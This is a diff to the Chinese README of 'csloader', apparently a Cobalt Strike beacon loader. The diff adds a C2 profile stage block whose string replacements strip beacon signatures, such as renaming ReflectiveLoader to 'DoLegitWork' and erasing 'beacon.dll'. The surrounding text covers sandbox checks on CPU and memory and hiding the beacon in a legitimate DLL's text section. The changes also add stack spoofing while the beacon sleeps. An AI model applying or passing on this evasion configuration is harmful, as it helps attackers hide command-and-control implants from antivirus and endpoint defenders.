@@ -32,18 +32,37 @@ csloader/
 以上功能均在加载器上实现，所以使用时尽量不要用udrl并且按照以下配置修改profile部分内容。
 
 ```c
-    set allocator      "VirtualAlloc"; 
+stage {
+    set allocator      "VirtualAlloc";
     set magic_mz_x86   "BLOB";
     set magic_mz_x64   "BLOB";
     set magic_pe       "EA";
     set userwx         "true";
     set stomppe        "true";
-    set obfuscate      "true";
+    set obfuscate      "false";
     set cleanup        "true";
     set sleep_mask     "false";
     set smartinject    "false";
-	set image_size_x86 "360448";
+    set image_size_x86 "360448";
     set image_size_x64 "360448";
+
+    transform-x86 {
+        strrep "ReflectiveLoader" "DoLegitWork";
+        strrep "beacon.dll"       "";
+        strrep "This program cannot be run in DOS mode" "";
+        strrep "%s (admin)"       "%s";
+        strrep "%s as %s\x5c%s"   "%s as %s/%s";
+    }
+
+    transform-x64 {
+        strrep "ReflectiveLoader" "DoLegitWork";
+        strrep "beacon.x64.dll"   "";
+        strrep "beacon.dll"       "";
+        strrep "This program cannot be run in DOS mode" "";
+        strrep "%s (admin)"       "%s";
+        strrep "%s as %s\x5c%s"   "%s as %s/%s";
+    }
+}
 ```
 生成BIN时按照如下配置即可，不要使用syscall
 
@@ -83,7 +102,7 @@ CPU/内存检查：CPU 逻辑核心数 > 4，物理内存 > 5 GB
 
 ### 内存保护
 
-beacon的sizeofImage如果小于一定字节（profile中配置image_size_x86/x64配置实际beacon需要的内存大小），就将Beacon展开到一个合法的dll的text节，用于伪装，同时在睡眠期间对Beacon做加密并设置内存不可访问。
+beacon的sizeofImage如果小于一定字节（profile中配置image_size_x86/x64配置实际beacon需要的内存大小），就将Beacon展开到一个合法的dll的text节，用于伪装，同时在睡眠期间对Beacon做加密并设置内存不可访问，同时把sleep函数的栈进行修改，进一步实现伪装。
 
 ### 加密处理
 
